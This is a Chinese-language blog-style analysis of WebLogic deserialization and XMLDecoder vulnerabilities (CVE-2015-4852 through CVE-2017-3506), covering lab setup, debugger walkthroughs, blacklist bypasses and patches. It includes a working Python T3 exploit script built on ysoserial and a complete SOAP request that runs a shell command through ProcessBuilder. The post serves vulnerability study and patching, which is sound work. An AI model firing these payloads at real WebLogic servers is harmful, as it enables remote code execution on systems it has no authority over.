## 概述

Oracle融合中间件（Oracle Fusion
Middleware）：Oracle融合中间件是一系列基于标准的软件产品，涵盖了一系列工具和服务：从Java
EE和开发人员工具，到集成服务、身份管理、商业智能和协作。Oracle融合中间件为开发、部署和管理提供完整的支持。

概括成九个字就是，一堆软件产品和服务。

图示如下：

![Overview of Oracle Fusion
Middleware](https://image.3001.net/images/20230612/1686579425_648728e1f327af5e9e757.gif!small)

可以从图看出，Web层级（Web Tier）有LBR、Oracle Web Cache、Oracle HTTP
Server，Web层级通过MBeans访问中间件层级的资源，中间件层级有Applications等，其中 **Oracle WebLogic
Server是核心** ，在数据层级中，有LDAP Server和Database，每个层级之间都使用防火墙隔离。

可以得出一个结论，Oracle融合中间件以WebLogic（简称）为核心，或者说Oracle融合中间件以WebLogic（简称）为基础。

WebLogic版本众多，但是现在我们经常见到的只有两个类别：10.x和12.x，这两个大版本也叫WebLogic Server 11g和WebLogic
Server 12c。（现在已经出到14.x了）

 **Oracle WebLogic Server 10.3.6支持的最低JDK版本为JDK1.6， Oracle WebLogic Server
12.1.3支持的最低JDK版本为JDK1.7，Oracle WebLogic Server 12.2.1及以上支持的最低JDK版本为JDK1.8** 。

简单记忆：

  * 10.3.6 - JDK1.6

  * 12.1.3 - JDK1.7

  * 12.2.1 - JDK1.8

### WebLogic 域

WebLogic域由多个WebLogic服务器组成，其中必须要有一个管理者，该管理者叫做管理服务器，管理控制台部署在管理服务器上，管理服务器是域的中央控制器，负责分发配置，记录中央日志等工作。管理服务器要是停了，
**对域中被管理的服务器的运行没有影响** 。

### 其他

#### 特性

WebLogic服务器默认开放于7001端口，同时一个端口接收多种协议（HTTP、T3、IIOP等）的请求，按照不同的协议类型转发到不同的处理器进行处理。

对于WebLogic的Web系统上的详细设计，我没有在官网找到资料，估计是WebLogic不开源的原因。

#### Oracle Coherence

Oracle Coherence是一个独立的内存数据网格系统，它可以独立运行，也可以与其他服务器集成使用。

Coherence可以作为一个独立的服务器运行，并提供高度可伸缩的内存数据网格、分布式缓存和数据处理等功能，支持多种数据处理和缓存方案。此外，Coherence还提供了用于管理和监视Coherence集群的工具和API。

另外，Coherence也可以与其他服务器集成使用，例如WebLogic Server、IBM
WebSphere、JBoss和Tomcat等。在这种情况下，Coherence通常作为一个嵌入式组件运行在这些服务器中，以提供高性能的内存数据缓存和处理功能。

总之，Coherence可以独立运行，也可以与其他服务器集成使用，具体取决于您的需求和应用场景。

WebLogic服务器默认不带有Oracle Coherence，Coherence是一个可选的组件，需要在WebLogic
Server中进行安装和配置，才能开始使用Coherence。

### Back

在[CVE list](https://www.cvedetails.com/vulnerability-list.php?vendor_id=93&product_id=14534&version_id=&page=1&hasexp=0&opdos=0&opec=0&opov=0&opcsrf=0&opgpriv=0&opsqli=0&opxss=0&opdirt=0&opmemc=0&ophttprs=0&opbyp=0&opfileinc=0&opginf=0&cvssscoremin=0&cvssscoremax=0&year=0&month=0&cweid=0&order=1&trc=271&sha=bbe74ffeac9afcd64024038a2a865e469c359106)中，CVE-2015-4852是个分水岭，因为在2010~2015这五年间未爆出任何WebLogic漏洞。

先看2015年前的：

CVE| 描述| NVA分数  
---|---|---  
[CVE-2008-2576](https://www.cvedetails.com/cve/CVE-2008-2576/)| Oracle BEA
Product Suite 9.2, 9.1, 9.0, and 8.1 SP6中的WebLogic
Server组件存在不详的漏洞，其影响和本地攻击向量未知。| 4.4  
[CVE-2008-2577](https://www.cvedetails.com/cve/CVE-2008-2577/)| Oracle BEA
Product Suite 9.2 MP1中的WebLogic Server组件存在不详的漏洞，影响未知，并有远程验证的攻击向量。| 4.6  
[CVE-2008-2578](https://www.cvedetails.com/cve/CVE-2008-2578/)| Oracle BEA
Product Suite 10.0和9.2 MP1中的WebLogic Server组件存在不详的漏洞，其影响和本地攻击向量未知。| 4.3  
[CVE-2008-2579](https://www.cvedetails.com/cve/CVE-2008-2579/)| Oracle BEA
Product Suite 10.0 MP1、9.2 MP3、9.1、9.0、8.1 SP6、7.0 SP7和6.1 SP7中的WebLogic
Server Plugins for Apache、Sun和IIS Web服务器组件存在不明原因的漏洞，影响和远程攻击向量未知。| 7.5  
[CVE-2008-3257](https://www.cvedetails.com/cve/CVE-2008-3257/)| Oracle
WebLogic Server（原BEA WebLogic Server）10.3及以前版本中的Apache
Connector（mod_wl）存在基于堆栈的缓冲区溢出，允许远程攻击者通过一个长的HTTP版本字符串执行任意代码，HTTP请求中 "POST /.jsp
"之后的字符串就是证明。| 10.0  
[CVE-2010-0073](https://www.cvedetails.com/cve/CVE-2010-0073/)| Oracle
WebLogic Server 7.0 SP7、8.1 SP6、9.0、9.1、9.2 MP3、10.0 MP2和10.3.2中的WebLogic
Server存在不明漏洞，允许远程攻击者通过未知攻击向量影响保密性、完整性和可用性。| 10.0  
[CVE-2010-2375](https://www.cvedetails.com/cve/CVE-2010-2375/)|
包/权限：Apache、Sun和IIS网络服务器的插件 Oracle Fusion Middleware 7.0 SP7、8.1
SP6、9.0、9.1、9.2 MP3、10.0 MP2、10.3.2和10.3.3中的WebLogic
Server组件存在特定漏洞，允许远程攻击者影响保密性和完整性，与IIS有关。| 6.4  
[CVE-2010-4453](https://www.cvedetails.com/cve/CVE-2010-4453/)| Oracle Fusion
Middleware 7.0.7、8.1.6、9.0、9.1、9.2.4、10.0.2、10.3.2和10.3.3中的Oracle WebLogic
Server组件存在不明漏洞，允许远程攻击者通过与Servlet容器有关的未知攻击向量影响完整性。| 4.3  
  
两个10.0评分的本质上都为堆栈溢出。有很多文章也并未提及2015年前的WebLogic漏洞，这8个漏洞对应的WebLogic版本久远，这些版本要求的jdk也比较低，现如今几乎没人会使用这么老的版本，所以漏洞复现和分析的意义并不是很大，所以就简单看一遍上面的描述过一遍即可。

然后就是分水岭CVE-2015-4852了，这个是利用T3协议的反序列化漏洞。

## 环境搭建

使用的是[WeblogicEnvironment](https://github.com/QAX-A-Team/WeblogicEnvironment)靶场，在项目根路径下创建jdks目录和weblogics目录，将下载好的jdk和对应的weblogic，分别放到这两个目录。

> 修改dockerfile文件，将FROM centos修改成FROM centos:centos7，同时注释掉RUN yum -y install
> libnsl
>
> 在#安装JDK所在行前添加如下内容：
>
> RUN sed -i 's/\r//' /scripts/jdk_install.sh
>
> RUN sed -i 's/\r//' /scripts/weblogic_install.sh
>
> RUN sed -i 's/\r//' /scripts/create_domain.sh
>
> RUN sed -i 's/\r//' /scripts/open_debug_mode.sh

以Weblogic10.3.6配JDK 6u25为例，构建镜像命令如下：

    
    
    docker build --build-arg JDK_PKG=jdk-6u25-linux-x64.bin --build-arg WEBLOGIC_JAR=wls1036_generic.jar  -t weblogic1036jdk6u25 .

镜像构建完成后，执行以下命令运行：

    
    
    docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk6u25 weblogic1036jdk6u25

8453为调试端口，7001为WebLogic管理控制台端口。

运行后可访问`http://localhost:7001/console/login/LoginForm.jsp`登录到Weblogic
Server管理控制台，默认用户名为`weblogic`,默认密码为`qaxateam01`。

从容器获取调试目录：

    
    
    docker cp weblogic1036jdk6u25:/u01/app/oracle/middleware/modules .  
    docker cp weblogic1036jdk6u25:/u01/app/oracle/middleware/wlserver .  
    docker cp weblogic1036jdk6u25:/u01/app/oracle/middleware/coherence_3.7/lib ./lib

## CVE-2015-4852

### 分析

T3协议是WebLogic进行RMI通信的底层实现，WebLogic会按照T3协议所要求的数据格式进行组装数据包。T3协议是JRMP协议改进而来，T3协议的数据包有两个特点：

  1. 前面四个字节，代表整个数据包的长度；

  2. 数据包中会带有多个序列化的java对象；

它跟JRMP的区别在于：动态生成stub和skeleton。

所以说只要WebLogic使用了一些高危组件，存在利用链，就可以把数据包中序列化的java对象改成自己的恶意对象，从而造成RCE。

简化后的通信过程如下：

  1. 与WebLogic服务器连接，商量使用的协议和版本号；

  2. 服务器返回支持的版本号；

  3. 客户端发送T3协议数据包；

网上payload如下：

    
    
    from os import popen  
    import struct # 负责大小端的转换  
    import subprocess  
    from sys import stdout  
    import socket  
    import re  
    import binascii  
    ​  
    def generatePayload(gadget,cmd):  
    YSO_PATH = "E:\\tools\\java\\ysoserial-master-d367e379d9-1.jar"  
    popen = subprocess.Popen(['java','-jar',YSO_PATH,gadget,cmd],stdout=subprocess.PIPE)  
    return popen.stdout.read()  
    ​  
    def T3Exploit(ip,port,payload):  
    sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
    sock.connect((ip,port))  
    handshake = "t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"  
    sock.sendall(handshake.encode())  
    data = sock.recv(1024)  
    compile = re.compile("HELO:(.*).0.false")  
    match = compile.findall(data.decode())  
    if match:  
        print("Weblogic: "+"".join(match))  
    else:  
        print("Not Weblogic")  
        #return  
    header = binascii.a2b_hex(b"00000000")  
    t3header = binascii.a2b_hex(b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006")  
    desflag = binascii.a2b_hex(b"fe010000")  
    payload = header + t3header  +desflag+  payload  
    payload = struct.pack(">I",len(payload)) + payload[4:]  
    sock.send(payload)  
    ​  
    if __name__ == "__main__":  
    ip = "127.0.0.1"  
    port = 7001  
    gadget = "CommonsCollections1"  
    cmd = "touch /tmp/hack"  
    payload = generatePayload(gadget,cmd)  
    T3Exploit(ip,port,payload)

这里直接将恶意序列化的对象直接放到第一位。

![1686578467_648725233b561ef7e28be.png!small?1686578465375](https://image.3001.net/images/20230612/1686578467_648725233b561ef7e28be.png!small?1686578465375)

当收到客户端的连接后，进入ExecuteThread的run方法。这里向执行进程管理器去注册执行进程，然后使用当前进程作为执行进行去处理该请求。

![1686578479_6487252fd35a6fd9a5495.png!small?1686578477959](https://image.3001.net/images/20230612/1686578479_6487252fd35a6fd9a5495.png!small?1686578477959)

执行数量加1，然后设置时间戳，接着调用SocketReaderRequest的execute方法。

![1686578486_6487253605ef081c61b73.png!small?1686578484131](https://image.3001.net/images/20230612/1686578486_6487253605ef081c61b73.png!small?1686578484131)

然后处理套接字。后续步骤如下：

  1. 识别协议类型，验证数据包格式等；

  2. 处理数据包头，判断数据包头所指示的数据包长度是否与实际的数据包长度相符；

  3. 处理待序列化对象；

在InboundMsgAbbrev#readObject处理待序列化对象：

![1686578494_6487253e4cda5aff71627.png!small?1686578492522](https://image.3001.net/images/20230612/1686578494_6487253e4cda5aff71627.png!small?1686578492522)

在read方法里，判断T3协议头后面是否还有内容，若还有内容，则var为0。

![1686578500_648725444fb851dff0c64.png!small?1686578498453](https://image.3001.net/images/20230612/1686578500_648725444fb851dff0c64.png!small?1686578498453)

然后将MsgAbbrevInputStream封装为ServerChannelInputStream，同时调用ServerChannelInputStream的readObject方法。ServerChannelInputStream类实现了ObjectInputStream，具有处理对象输入流的能力，但是它并未重写readObject方法，所以ServerChannelInputStream未扩展读取输入流中的对象的功能，只能交由父类ObjectInputStream去读取。

![1686578520_6487255875dcef7f00895.png!small?1686578518531](https://image.3001.net/images/20230612/1686578520_6487255875dcef7f00895.png!small?1686578518531)

它重写了resolveClass方法：

![1686578526_6487255e586e15152ac9b.png!small?1686578524518](https://image.3001.net/images/20230612/1686578526_6487255e586e15152ac9b.png!small?1686578524518)

在resolveClass方法中，调用父类的resolveClass方法：父类的resolveClass方法中，通过Class的forName方法注册类。然后判断类是否与本地的SerialVersionUID相同。这里未做任何过滤的操作。这里的ObjectStreamClass是数据包中序列化对象的抽象，从流中读取的序列化对象的信息（包括类的描述信息、变量信息等）会封装到该类中。

### 小结

在InboundMsgAbbrev#readObject方法中，调用readObject去反序列化恶意对象，触发恶意对象的readObject方法。这里由于WebLogic带了collections库从而可以使用CC链，配合CC链造成RCE。

### 修复

[补丁](https://pan.baidu.com/s/1hrGJNNI)来自RoboTerh师傅 ，安装步骤如下：

    
    
    1、新建cache_dir目录  
    mkdir -p /u01/app/oracle/middleware/utils/bsu/cache_dir  
    2、将压缩包上传到cache_dir目录，在宿主机下执行docker命令  
    docker cp D:/BaiduNetdiskDownload/weblogic反序列化漏洞补丁.zip weblogic1036jdk6u25:/u01/app/oracle/middleware/utils/bsu/cache_dir  
    3、解压  
    cd /u01/app/oracle/middleware/utils/bsu/cache_dir  
    unzip D:/BaiduNetdiskDownload/weblogic反序列化漏洞补丁.zip -d .  
    unzip p20780171_1036_Generic.zip -d .  
    4、调大内存参数  
    cd ../  
    vi ./bsu.sh  
    -------  
    #!/bin/sh  
    ​  
    JAVA_HOME="/java"  
    ​  
    MEM_ARGS="-Xms512m -Xmx1024m" #调节该处  
    ​  
    "$JAVA_HOME/bin/java" ${MEM_ARGS} -jar patch-client.jar $*  
    ​  
    :wq  
    -------  
    5、安装补丁  
    ./bsu.sh -install -patch_download_dir=/u01/app/oracle/middleware/utils/bsu/cache_dir  -patchlist=EJUW  -prod_dir=/u01/app/oracle/middleware/wlserver  
    6、查看是否安装成功  
    ./bsu.sh -prod_dir=/u01/app/oracle/middleware/wlserver -status=applied -verbose -view

![1686578544_64872570b37c1fb3f6bee.png!small?1686578543044](https://image.3001.net/images/20230612/1686578544_64872570b37c1fb3f6bee.png!small?1686578543044)

然后再以同样的方式安装p22248开头的那个zip压缩包里的补丁。

![1686578549_64872575f1c5eaa5a4b1e.png!small?1686578548270](https://image.3001.net/images/20230612/1686578549_64872575f1c5eaa5a4b1e.png!small?1686578548270)

然后重启一下docker容器。

重新使用payload攻击，服务器报以下错误：

![1686578556_6487257c1c4bcc6252c85.png!small?1686578554133](https://image.3001.net/images/20230612/1686578556_6487257c1c4bcc6252c85.png!small?1686578554133)

  

重新复制lib包：

    
    
    docker cp weblogic1036jdk6u25:/u01/app/oracle/middleware/modules .  
    docker cp weblogic1036jdk6u25:/u01/app/oracle/middleware/wlserver .  
    docker cp weblogic1036jdk6u25:/u01/app/oracle/middleware/coherence_3.7/lib ./lib

打开IDEA进行调试：

![1686578563_64872583324467a09bce1.png!small?1686578561577](https://image.3001.net/images/20230612/1686578563_64872583324467a09bce1.png!small?1686578561577)

在ServerChannelInputStream#resolveClass作类名检查。判断是否属于如下黑名单：

![1686578568_64872588ee582cde4a392.png!small?1686578567332](https://image.3001.net/images/20230612/1686578568_64872588ee582cde4a392.png!small?1686578567332)

若属于，则抛出异常。

  

## 分割线

以下两个CVE-2016-0638，CVE-2016-3510都使用[weblogic_cmd](https://github.com/5up3rc/weblogic_cmd)项目进行复现。

## CVE-2016-0638

### 分析

0638是对4852的绕过，用是黑名单没有的类StreamMessageImpl，绕过了ServerChannelInputStream的黑名单。

![1686578575_6487258fb18b4224d3dcf.png!small?1686578574082](https://image.3001.net/images/20230612/1686578575_6487258fb18b4224d3dcf.png!small?1686578574082)

所以能成功调用到该类StreamMessageImpl的readExternal方法进行反序列化：

![1686578581_6487259527a592bce4b8e.png!small?1686578579471](https://image.3001.net/images/20230612/1686578581_6487259527a592bce4b8e.png!small?1686578579471)

而在它的readExternal中，自己创建了个新的ObjectInputStream，然后从该ObjectInputStream中读取序列化对象，进行反序列化。如上图`var5.readObject()`就是反序列化恶意对象。因为原生的ObjectInputStream并未过滤恶意对象，所以绕过4852的ServerChannelInputStream的黑名单。

现在看他如何包装对象输入流的：

![1686578589_6487259d0e34df38bc359.png!small?1686578587442](https://image.3001.net/images/20230612/1686578589_6487259d0e34df38bc359.png!small?1686578587442)

首先调用createPayload方法：

![1686578594_648725a2c227393532f9c.png!small?1686578593548](https://image.3001.net/images/20230612/1686578594_648725a2c227393532f9c.png!small?1686578593548)

这里的CHUNK_LINK_THRESHOLD属性是36720大于读取的1407，所以不走if块，然后调用copyPayloadFromStream方法：

![1686578601_648725a900c86a5c35b03.png!small?1686578599230](https://image.3001.net/images/20230612/1686578601_648725a900c86a5c35b03.png!small?1686578599230)

这里先介绍一下chunk，chunk是 WebLogic Server
网络层（客户端和服务器端）用于从套接字读取数据和向套接字写入数据的内存单元。上面的代码讲的是，从输入流读取的块的长度1407（var2）要是比两个内存单元的长度8160（`Chunk.CHUNK_SIZE
*
2`）的小，就以输入流读取的块的长度1407为准，创建一个1407大小的共享内存单元，然后将输入流var0中的数据复制到该共享内存单元中，也就是var3中，然后将var3作为PayloadChunkBase的chunk属性的值。

回到readExternal方法：

![1686578606_648725ae86b249dcf8b02.png!small?1686578604772](https://image.3001.net/images/20230612/1686578606_648725ae86b249dcf8b02.png!small?1686578604772)

第一步走完，将PayloadChunkBase类实例赋给payload属性，第二步从payload中获取输入流，输入流中的数据就是chunk属性的值。然后将输入流包装成对象输入流。

所以说它仅仅是将原来输入流中的数据复制到一个新的输入流而已。

所以我们只要将序列化的对象设置为StreamMessageImpl类实例，然后将恶意对象序列化的字节到StreamMessageImpl类实例字节码的后面即可。

在readExternal方法中，先读取一个字节readByte，字节值为1才能进入case
1的switch语句中，然后createPayload中，又读取一个int(readInt)，这个int值就是恶意对象字节码的长度，然后剩下的部分就是恶意对象序列化后的字节码了。格式如下：

ac ed 00 05| StreamMessageImpl| 01| 恶意对象字节码的长度| 恶意对象字节码  
---|---|---|---|---  
  
怎么构造攻击payload？

  1. 从jar包中提取出StreamMessageImpl类，然后修改它的writeExternal方法，writeExternal方法写入的数据和readExternal读取的数据保持一致。

  2. 序列化StreamMessageImpl，获取字节码。

  3. 抓取T3协议包，修改任意一个序列化对象的字节码为我们的StreamMessageImpl的字节码，并重新计算整个包的长度，然后将包头的长度替换成新的长度。

## CVE-2016-3510

### 分析

该漏洞和0638相同，同样找的是绕过黑名单的类，同时该类能触发二次反序列化。

而这次使用的是MarshalledObject类，由于它自身并没有实现readObject方法，所以我们跟一下流程，从
InboundMsgAbbrev#readObject开始：-
![1686578618_648725ba1b29e1cb373f1.png!small?1686578616332](https://image.3001.net/images/20230612/1686578618_648725ba1b29e1cb373f1.png!small?1686578616332)

这里开始反序列化MarshalledObject类，由ObjectInputStream操刀（之前说过ServerChannelInputStream继承ObjectInputStream且并未重写readObject方法，所以调用ObjectInputStream的readObject方法）：

![1686578624_648725c058ea373be6da9.png!small?1686578622493](https://image.3001.net/images/20230612/1686578624_648725c058ea373be6da9.png!small?1686578622493)

不允许覆盖，进入else语句，调用readObject0方法。

![1686578630_648725c654fea1a222e42.png!small?1686578628892](https://image.3001.net/images/20230612/1686578630_648725c654fea1a222e42.png!small?1686578628892)

标志位为115，则读取原始对象readOrdinaryObject()。

![1686578638_648725ce73e7ae517153e.png!small?1686578636875](https://image.3001.net/images/20230612/1686578638_648725ce73e7ae517153e.png!small?1686578636875)

![1686578644_648725d4740abc76cfae7.png!small?1686578642622](https://image.3001.net/images/20230612/1686578644_648725d4740abc76cfae7.png!small?1686578642622)

ObjectStreamClass类是输入流中的序列化对象的抽象表示。然后调用invokeReadResolve方法：

![1686578650_648725da9dbdbf87e655a.png!small?1686578648724](https://image.3001.net/images/20230612/1686578650_648725da9dbdbf87e655a.png!small?1686578648724)

反射调用MarshalledObject的readResolve方法。

![1686578656_648725e0245c6f66d2a3e.png!small?1686578654300](https://image.3001.net/images/20230612/1686578656_648725e0245c6f66d2a3e.png!small?1686578654300)

在readResolve方法里，新建了ObjectInputStream，同时对象输入流中的数据来源于objBytes属性的值，最后使用ObjectInputStream的readObject方法从流中读取对象。完成二次反序列化，所以可以将恶意对象封装到objBytes属性中，即可触发攻击。

而该属性赋值十分简单，只需要new一个MarshalledObject时，传递一个对象即可，他就会将该对象转成字节数组并赋给objBytes属性：

![1686578663_648725e77a6eaea0cfc2d.png!small?1686578661638](https://image.3001.net/images/20230612/1686578663_648725e77a6eaea0cfc2d.png!small?1686578661638)

## CVE-2017-3248

### 分析

使用[CVE-2017-3248](https://github.com/BabyTeam1024/CVE-2017-3248)作为payload~

这个漏洞会使用底层JRMP向指定的JRMP服务端发起一个连接，而我们可以伪造一个服务端，向客户端返回一个恶意对象，客户端收到这个恶意对象后反序列化造成命令执行。

这个同样找的是绕过黑名单的类，不过这次不是二次反序列化，而是一次反序列化后发起JRMP请求。

这次封装的类为代理类，它的InvocationHandler实现为RemoteObjectInvocationHandler，该类处理远程对象的调用，反序列化代理类时，会先反序列化RemoteObjectInvocationHandler，但是它并没有实现readObject方法，而它的父类RemoteObject实现了该方法：

![1686578671_648725ef60cc632c13792.png!small?1686578669583](https://image.3001.net/images/20230612/1686578671_648725ef60cc632c13792.png!small?1686578669583)

按UTF格式读取一个字符串（UnicastRef），然后注册该类、实例化赋给ref属性，然后调用ref属性的readExternal方法。

![1686578676_648725f46dcd35e8bbf02.png!small?1686578674738](https://image.3001.net/images/20230612/1686578676_648725f46dcd35e8bbf02.png!small?1686578674738)

接着调用LiveRef的静态方法read，将输入流传递。

![1686578681_648725f9490bda1083923.png!small?1686578679608](https://image.3001.net/images/20230612/1686578681_648725f9490bda1083923.png!small?1686578679608)

ObjID是远程对象的唯一标识，然后调用registerRefs方法（图中说错了，应该是作为DGC客户端去租用远程对象引用）。

后续跳过一些类，来到UnicastRef的newCall方法：

![1686578687_648725ff194e3f6be168a.png!small?1686578685221](https://image.3001.net/images/20230612/1686578687_648725ff194e3f6be168a.png!small?1686578685221)

获取TCP信道，然后发起连接。

### 修复

在`ServerChannelInputStream`的`resolveProxyClass`方法中使用了黑名单对反序列化类进行限制：

    
    
    protected Class<?> resolveProxyClass(String[] interfaces) throws IOException, ClassNotFoundException {  
    String[] arr$ = interfaces;  
    int len$ = interfaces.length;  
    ​  
    for(int i$ = 0; i$ < len$; ++i$) {  
      String intf = arr$[i$];  
      if(intf.equals("java.rmi.registry.Registry")) {  
         throw new InvalidObjectException("Unauthorized proxy deserialization");  
      }  
    }  
    ​  
    return super.resolveProxyClass(interfaces);  
    }

由于我们使用的是动态代理类，代理的接口为Registry，而该resolveProxyClass方法中，判断反序列化的类实现的接口是否为java.rmi.registry.Registry，是的话则抛出异常。巧好就修复了该漏洞。

但是我们只需用java.rmi.activation.Activator替换java.rmi.registry.Registry就能绕过该补丁，这就是CVE-2018-2628的原理。

## CVE-2017-3506

### 分析

使用[CVE-2017-3506](https://github.com/Al1ex/CVE-2017-3506)作为payload。

这是个XMLDecoder的反序列化漏洞，先理解一下XMLDecoder：

#### JDK1.6的XMLDecoder

XMLDecoder用来解析XML元素，在jdk1.6中，它带有一个handler属性，这个属性是ObjectHandler类型，使用该属性来解析XML标签。

在ObjectHandler类中，startElement方法用来解析开始标签，他接受两个参数，第一个var1为标签名，第二个var2是标签带有的属性列表。

![1686578695_64872607f086c657f6d8e.png!small?1686578694393](https://image.3001.net/images/20230612/1686578695_64872607f086c657f6d8e.png!small?1686578694393)

这里根据不同的标签和标签所带的属性进行解析。var4是MutableExpression类实例：

![1686578701_6487260dd3a49b3a33e85.png!small?1686578699969](https://image.3001.net/images/20230612/1686578701_6487260dd3a49b3a33e85.png!small?1686578699969)

当调用MutableExpression类的getValue时，他会执行methodName所指定的方法。

然后看看startElement方法下面：

![1686578706_64872612dc83d9eaee32f.png!small?1686578705135](https://image.3001.net/images/20230612/1686578706_64872612dc83d9eaee32f.png!small?1686578705135)

会根据不同的标签名，将不同的方法和目标绑定到MutableExpression类实例中（var4.setMethodName和var4.setTarget）

![1686578715_6487261b788e56f98f3f6.png!small?1686578713633](https://image.3001.net/images/20230612/1686578715_6487261b788e56f98f3f6.png!small?1686578713633)

然后将MutableExpression类实例添加到栈中。

接着在ObjectHandler的endElement方法解析结束标签：

![1686578720_648726208ad4e152401e1.png!small?1686578718701](https://image.3001.net/images/20230612/1686578720_648726208ad4e152401e1.png!small?1686578718701)

![1686578726_648726263f6684e18738e.png!small?1686578724352](https://image.3001.net/images/20230612/1686578726_648726263f6684e18738e.png!small?1686578724352)

而它会从栈中取出MutableExpression类实例并通过getValue执行绑定的方法。

poc如下：

    
    
    POST /wls-wsat/CoordinatorPortType HTTP/1.1  
    Host: 172.21.65.112:7001  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8  
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
    Connection: close  
    Upgrade-Insecure-Requests: 1  
    Cache-Control: max-age=0  
    Content-Length: 824  
    Accept-Encoding: gzip, deflate  
    SOAPAction:  
    Accept: */*  
    User-Agent: Apache-HttpClient/4.1.1 (java 1.5)  
    Connection: keep-alive  
    Content-Type: text/xml  
    ​  
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">  
    <soapenv:Header>  
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">  
      <java version="1.8.0_131" class="java.beans.XMLDecoder">  
        <void class="java.lang.ProcessBuilder">  
          <array class="java.lang.String" length="3">  
            <void index="0">  
              <string>/bin/bash</string>  
            </void>  
            <void index="1">  
              <string>-c</string>  
            </void>  
            <void index="2">  
              <string>touch /tmp/CVE-2017-3506</string>  
            </void>  
          </array>  
          <void method="start"/>  
        </void>  
      </java>  
    </work:WorkContext>  
    </soapenv:Header>  
    <soapenv:Body/>  
    </soapenv:Envelope>

在该路由/wls-wsat/CoordinatorPortType解析了xml标签，打断点查看处理过程：

WorkContextServerTube#processRequest来处理请求：

![1686578738_64872632de68008ca330c.png!small?1686578737117](https://image.3001.net/images/20230612/1686578738_64872632de68008ca330c.png!small?1686578737117)

调用getMessage方法，进入getMessage方法查看：

![1686578743_64872637a4d737934da4f.png!small?1686578741825](https://image.3001.net/images/20230612/1686578743_64872637a4d737934da4f.png!small?1686578741825)

其实这个if就是判断是否有XML约束信息。

![1686578750_6487263e178d2cff2e537.png!small?1686578748211](https://image.3001.net/images/20230612/1686578750_6487263e178d2cff2e537.png!small?1686578748211)

获取头列表。

![1686578755_64872643cec935ce7aa30.png!small?1686578754269](https://image.3001.net/images/20230612/1686578755_64872643cec935ce7aa30.png!small?1686578754269)

判断头列表是否有WorkContext。

![1686578761_64872649489e86bb16759.png!small?1686578759862](https://image.3001.net/images/20230612/1686578761_64872649489e86bb16759.png!small?1686578759862)

接着调用readHeaderOld方法。

![1686578767_6487264f1090dd7ffe61f.png!small?1686578765251](https://image.3001.net/images/20230612/1686578767_6487264f1090dd7ffe61f.png!small?1686578765251)

这里简单包装转化了一下，然后调用receive方法。

![1686578771_64872653b3da430fd7f72.png!small?1686578769923](https://image.3001.net/images/20230612/1686578771_64872653b3da430fd7f72.png!small?1686578769923)

接着调用receiveRequest方法。

![1686578776_648726588d24698acf5ec.png!small?1686578774643](https://image.3001.net/images/20230612/1686578776_648726588d24698acf5ec.png!small?1686578774643)

![1686578781_6487265d158a1168db79d.png!small?1686578779153](https://image.3001.net/images/20230612/1686578781_6487265d158a1168db79d.png!small?1686578779153)

![1686578786_64872662afa991152d6a5.png!small?1686578784780](https://image.3001.net/images/20230612/1686578786_64872662afa991152d6a5.png!small?1686578784780)

![1686578791_6487266790fed5be798a5.png!small?1686578789653](https://image.3001.net/images/20230612/1686578791_6487266790fed5be798a5.png!small?1686578789653)

最后来到了xmlDecoder的readObject方法：

![1686578811_6487267bdd94e1ce2f89c.png!small?1686578810485](https://image.3001.net/images/20230612/1686578811_6487267bdd94e1ce2f89c.png!small?1686578810485)

会调用getHandler获取处理器。

![1686578816_64872680d7cc523e8ea38.png!small?1686578815135](https://image.3001.net/images/20230612/1686578816_64872680d7cc523e8ea38.png!small?1686578815135)

然后在getHandler方法中，由于handler属性为空，所以创建一个新的ObjectHandler赋给handler属性，并调用parse方法解析xml输入流。

    
    
    <void class="java.lang.ProcessBuilder">  
    <array class="java.lang.String" length="3">  
    <void index="0">  
    <string>/bin/bash</string>  
    </void>  
    <void index="1">  
    <string>-c</string>  
    </void>  
    <void index="2">  
    <string>touch /tmp/CVE-2017-3506</string>  
    </void>  
    </array>  
    <void method="start"/>  
    </void>

解析的时候会实例化ProcessBuilder，并调用start方法执行命令。

对于标签的处理流程如下：

  1. 解析到void标签，设置表达式的target为ProcessBuilder，method为new，然后压栈；

  2. 解析到array标签，设置表达式的target为Array，method为new，然后压栈；

  3. 解析到array结束标签，出栈，实例化String数组；

  4. 解析到void标签（`<void method="start"/>`），设置method为start，因为没有class属性，所以没有设置target，然后出栈，new一个ProcessBuilder，然后将ProcessBuilder实例设置成target；

  5. 解析到void结束标签，出栈，执行ProcessBuilder的start方法。

### 修复

安装补丁后，WorkContextXmlInputAdapter添加了个validate方法：

    
    
    public WorkContextXmlInputAdapter(InputStream is)  
    {  
    ByteArrayOutputStream baos = new ByteArrayOutputStream();  
    try  
    {  
      int next = 0;  
      next = is.read();  
      while (next != -1)  
      {  
        baos.write(next);  
        next = is.read();  
      }  
    }  
    catch (Exception e)  
    {  
      throw new IllegalStateException("Failed to get data from input stream", e);  
    }  
    validate(new ByteArrayInputStream(baos.toByteArray()));  
    this.xmlDecoder = new XMLDecoder(new ByteArrayInputStream(baos.toByteArray()));  
    }  
      
    private void validate(InputStream is)  
    {  
    WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();  
    try  
    {  
      SAXParser parser = factory.newSAXParser();  
      parser.parse(is, new DefaultHandler()  
      {  
        public void startElement(String uri, String localName, String qName, Attributes attributes)  
          throws SAXException  
        {  
          if (qName.equalsIgnoreCase("object")) {  
            throw new IllegalStateException("Invalid context type: object");  
          }  
        }  
      });  
    }  
    catch (ParserConfigurationException e)  
    {  
      throw new IllegalStateException("Parser Exception", e);  
    }  
    catch (SAXException e)  
    {  
      throw new IllegalStateException("Parser Exception", e);  
    }  
    catch (IOException e)  
    {  
      throw new IllegalStateException("Parser Exception", e);  
    }  
    }

